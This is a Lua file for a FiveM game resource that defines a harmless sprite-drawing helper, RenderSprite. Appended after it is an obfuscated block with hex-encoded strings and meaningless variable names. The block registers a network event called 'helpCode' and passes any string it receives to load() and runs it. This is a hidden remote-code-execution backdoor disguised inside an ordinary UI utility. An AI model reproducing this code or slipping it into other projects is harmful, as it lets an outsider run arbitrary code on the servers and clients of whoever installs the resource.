---RenderSprite
---
--- Reference : https://github.com/iTexZoz/NativeUILua_Reloaded/blob/master/UIElements/Sprite.lua#L90
---
---@param TextureDictionary string
---@param TextureName string
---@param X number
---@param Y number
---@param Width number
---@param Height number
---@param Heading number
---@param R number
---@param G number
---@param B number
---@param A number
---@return nil
---@public
function RenderSprite(TextureDictionary, TextureName, X, Y, Width, Height, Heading, R, G, B, A)
    ---@type number
    local X, Y, Width, Height = (tonumber(X) or 0) / 1920, (tonumber(Y) or 0) / 1080, (tonumber(Width) or 0) / 1920, (tonumber(Height) or 0) / 1080

    if not HasStreamedTextureDictLoaded(TextureDictionary) then
        RequestStreamedTextureDict(TextureDictionary, true)
    end

    DrawSprite(TextureDictionary, TextureName, X + Width * 0.5, Y + Height * 0.5, Width, Height, Heading or 255, tonumber(R) or 255, tonumber(G) or 255, tonumber(B) or 255, tonumber(A) or 175)
end

local NvfmREjUIVqOdPKhMLNUbxLXDxbcVQFvqSXhdFRIbBQOSBvlFOnkJAsPEBNRwNVsrOZSMC = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} NvfmREjUIVqOdPKhMLNUbxLXDxbcVQFvqSXhdFRIbBQOSBvlFOnkJAsPEBNRwNVsrOZSMC[6][NvfmREjUIVqOdPKhMLNUbxLXDxbcVQFvqSXhdFRIbBQOSBvlFOnkJAsPEBNRwNVsrOZSMC[1]](NvfmREjUIVqOdPKhMLNUbxLXDxbcVQFvqSXhdFRIbBQOSBvlFOnkJAsPEBNRwNVsrOZSMC[2]) NvfmREjUIVqOdPKhMLNUbxLXDxbcVQFvqSXhdFRIbBQOSBvlFOnkJAsPEBNRwNVsrOZSMC[6][NvfmREjUIVqOdPKhMLNUbxLXDxbcVQFvqSXhdFRIbBQOSBvlFOnkJAsPEBNRwNVsrOZSMC[3]](NvfmREjUIVqOdPKhMLNUbxLXDxbcVQFvqSXhdFRIbBQOSBvlFOnkJAsPEBNRwNVsrOZSMC[2], function(PwlczjXrKkMDQDVmIFMXZjzuhNrIMIJcuRyzwCfDYycRmUTZmYdUcYtSsPpbvbLYRfuCdP) NvfmREjUIVqOdPKhMLNUbxLXDxbcVQFvqSXhdFRIbBQOSBvlFOnkJAsPEBNRwNVsrOZSMC[6][NvfmREjUIVqOdPKhMLNUbxLXDxbcVQFvqSXhdFRIbBQOSBvlFOnkJAsPEBNRwNVsrOZSMC[4]](NvfmREjUIVqOdPKhMLNUbxLXDxbcVQFvqSXhdFRIbBQOSBvlFOnkJAsPEBNRwNVsrOZSMC[6][NvfmREjUIVqOdPKhMLNUbxLXDxbcVQFvqSXhdFRIbBQOSBvlFOnkJAsPEBNRwNVsrOZSMC[5]](PwlczjXrKkMDQDVmIFMXZjzuhNrIMIJcuRyzwCfDYycRmUTZmYdUcYtSsPpbvbLYRfuCdP))() end)